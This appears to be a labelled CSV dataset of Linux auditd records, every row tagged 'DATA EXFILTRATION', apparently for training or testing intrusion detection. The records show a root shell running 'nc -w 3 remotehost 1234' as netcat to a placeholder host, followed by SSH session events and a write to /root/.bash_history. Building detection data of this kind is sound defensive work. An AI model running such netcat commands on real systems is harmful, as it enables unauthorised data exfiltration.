label,a0,a1,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a2,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a3,a30,a4,a5,a6,a7,a8,a9,acct,addr,arch,arg,argc,auid,cap_fe,cap_fi,cap_fp,cap_frootid,cap_fver,color,comm,cwd,dev,egid,euid,exe,exit,fam,fe,fi,fp,frootid,fsgid,fsuid,fver,gid,grantors,hostname,id,inode,item,items,key,laddr,lport,mode,msg,name,nametype,ogid,old_pa,old_pe,old_pi,old_pp,old_prom,op,ouid,pa,path,pe,pi,pid,pp,ppid,proctitle,prom,rdev,res,result,saddr,saddr_fam,ses,sgid,subj,success,suid,syscall,terminal,tty,type,uid,unit
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(12/03/2025 03:25:27.530:14563),,,,,,,,,,,,,,,,,,nc -w 3 remotehost 1234,,,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,,,,,,,1853150,1,,,,,"file,755",audit(12/03/2025 03:25:27.530:14563),/lib64/ld-linux-x86-64.so.2,NORMAL,root,,,,,,,root,,,,,,,,,,00:00,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,,,,,,,1836100,0,,,,,"file,755",audit(12/03/2025 03:25:27.530:14563),/usr/bin/nc,NORMAL,root,,,,,,,root,,,,,,,,,,00:00,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,,,,,,,audit(12/03/2025 03:25:27.530:14563),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,nc,-w,,,,,,,,,,,3,,,,,,,,,,,remotehost,,1234,,,,,,,,,,5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(12/03/2025 03:25:27.530:14563),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EXECVE,,
DATA EXFILTRATION,0x5eaec8811970,0x5eaec880e470,,,,,,,,,,,0x5eaec87f0520,,,,,,,,,,,0x5eaec88089a0,,,,,,,,,,x86_64,,,ubuntu,,,,,,,nc,,,root,root,/usr/bin/nc.openbsd,0,,,,,,root,root,,root,,,,,,2,DATA_EXFILTRATION,,,,audit(12/03/2025 03:25:27.530:14563),,,,,,,,,,,,,,,28147,,28139,,,,,,,,3,root,unconfined,yes,root,execve,,pts5,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ubuntu,192.168.10.1,,,,ubuntu,,,,,,,,,,,,/usr/sbin/sshd,,,,,,,,,,,"pam_selinux,pam_loginuid,pam_keyinit,pam_permit,pam_umask,pam_unix,pam_systemd,pam_mail,pam_limits,pam_env,pam_env,pam_selinux""",192.168.10.1,,,,,,,,,audit(12/03/2025 03:25:37.468:14564),,,,,,,,,"PAM:session_close,""",,,,,,3625,,,,,,success,,,,4,,unconfined,,,,ssh,,USER_END,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ubuntu,192.168.10.1,,,,ubuntu,,,,,,,,,,,,/usr/sbin/sshd,,,,,,,,,,,pam_permit,192.168.10.1,,,,,,,,,audit(12/03/2025 03:25:37.469:14565),,,,,,,,,PAM:setcred,,,,,,3625,,,,,,success,,,,4,,unconfined,,,,ssh,,CRED_DISP,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(12/03/2025 03:25:37.512:14566),,,,,,,,,,,,,,,,,,bash,,,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,,,,,,,917534,0,,,,,"file,600",audit(12/03/2025 03:25:37.512:14566),/root/.bash_history,NORMAL,root,,,,,,,root,,,,,,,,,,00:00,,,,,,,,,,,,,PATH,,
